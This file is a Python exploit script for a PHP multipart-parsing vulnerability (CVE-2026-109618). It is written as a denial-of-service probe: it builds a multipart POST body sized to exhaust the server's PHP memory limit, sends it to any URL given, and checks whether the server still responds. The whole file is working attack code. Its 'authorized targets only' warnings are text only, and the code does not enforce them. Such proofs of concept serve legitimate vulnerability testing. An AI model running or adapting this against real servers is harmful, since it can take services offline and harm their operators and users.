#!/usr/bin/env python3
"""Bounded trigger for the CVE-2026-109618 multipart OOM condition.

This intentionally demonstrates only the OOM/cleanup trigger described by
PHP's advisory. It does not attempt memory corruption or command execution.

Target: any online URL you own or are explicitly authorized to test, e.g.:

    python3 trigger_cve_2026_109618.py --url https://target.com/

WARNING: this sends a request that makes the server exhaust its PHP memory
(a DoS-class probe). Use it only against authorized targets, keep
--value-size as small as works, and do not run it in a loop.
"""

from __future__ import annotations

import argparse
import http.client
import ssl
import sys
import time
from urllib.parse import urlsplit

BOUNDARY = b"php-oom-probe"
MAX_BODY = 7_900_000
# Apache's DefaultLimitRequestFields (100) caps the *total* number of headers
# in the request-line block; multipart part headers ride inside that same
# count, so a part with tens of thousands of headers would be rejected with
# HTTP 400 by Apache before PHP ever parsed the body. Keep the part-header
# count under that limit and drive the memory exhaustion with a large part
# value instead (calibrated for memory_limit=16M / post_max_size=8M; tune
# with --value-size for other targets).
PART_HEADER_LIMIT = 90
PART_VALUE_SIZE = 7_500_000


def make_body(value_size: int = PART_VALUE_SIZE) -> bytes:
    head = (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="upload"; filename="probe.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n"
    )
    lines = bytearray()
    for i in range(PART_HEADER_LIMIT):
        lines.extend(f"X-Poc-{i:08d}: ".encode("ascii"))
        lines.extend(b"v" * 64)
        lines.extend(b"\r\n")
    body = (
        head
        + bytes(lines)
        + b"\r\n"
        + b"v" * value_size
        + b"\r\n--" + BOUNDARY + b"--\r\n"
    )
    if len(body) > MAX_BODY:
        raise SystemExit(f"Refusing oversized trigger body: {len(body)} bytes")
    return body


def open_connection(scheme: str, hostname: str, port: int | None, timeout: float,
                    insecure: bool = False):
    if scheme == "https":
        context = ssl._create_unverified_context() if insecure else ssl.create_default_context()
        return http.client.HTTPSConnection(
            hostname, port or 443, timeout=timeout, context=context
        )
    return http.client.HTTPConnection(hostname, port or 80, timeout=timeout)


def request(target, method: str = "GET", path: str | None = None,
            body: bytes | None = None):
    scheme, hostname, port, timeout, base_path, insecure = target
    conn = open_connection(scheme, hostname, port, timeout, insecure)
    conn.request(method, path if path is not None else (base_path or "/"), body=body, headers={
        "Host": conn.host if not port else f"{hostname}:{port}",
        "User-Agent": "php2shell-poc-trigger/1.0",
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY.decode()}" if body else "text/plain",
        "Connection": "close",
    })
    response = conn.getresponse()
    result = response.status, response.read(2048).decode("latin1", "replace")
    conn.close()
    return result


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--url", required=True,
                        help="Online target URL, e.g. https://target.com/")
    parser.add_argument("--baseline-path", default="/",
                        help="Path used for the health check (default: /)")
    parser.add_argument("--post-path", default=None,
                        help="Where to POST the multipart payload (default: same as --baseline-path)")
    parser.add_argument("--baseline-marker", default="",
                        help="Optional substring expected in the baseline response; "
                             "if set and absent, the script aborts before sending the trigger")
    parser.add_argument("--value-size", type=int, default=PART_VALUE_SIZE,
                        help="Multipart part value size in bytes; tune to the target's "
                             "memory_limit/post_max_size (default calibrated for 16M/8M)")
    parser.add_argument("--insecure", action="store_true",
                        help="Skip TLS certificate verification (self-signed targets)")
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()

    parsed = urlsplit(args.url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise SystemExit("Provide an absolute http(s) target URL, e.g. https://target.com/")
    target = (parsed.scheme, parsed.hostname, parsed.port, args.timeout,
              parsed.path or "/", args.insecure)
    post_path = args.post_path if args.post_path is not None else (parsed.path or "/")

    status, body = request(target)
    if args.baseline_marker and args.baseline_marker not in body:
        raise SystemExit(
            f"Baseline did not contain {args.baseline_marker!r} (HTTP {status}); "
            "wrong host? pass a different --baseline-marker or --baseline-path"
        )
    print(f"Baseline: HTTP {status}; {body.strip()[:200]!r}")

    payload = make_body(args.value_size)
    print(
        f"Sending bounded multipart OOM trigger to {args.url}{post_path}: "
        f"{PART_HEADER_LIMIT} part headers, {len(payload)} bytes"
    )
    try:
        status, body = request(target, "POST", post_path, payload)
        print(f"Trigger response: HTTP {status}; {body[:200]!r}")
    except (OSError, TimeoutError, http.client.HTTPException) as exc:
        print(f"Trigger request ended during server-side OOM handling: {type(exc).__name__}: {exc}")

    time.sleep(1)
    try:
        status, body = request(target)
        print(f"Follow-up health check: HTTP {status}; {body.strip()[:200]!r}")
    except (OSError, TimeoutError, http.client.HTTPException) as exc:
        print(f"Follow-up health check failed: {type(exc).__name__}: {exc}")

    print("Scope: OOM trigger only; no RCE claim or command execution was attempted.")


if __name__ == "__main__":
    main()
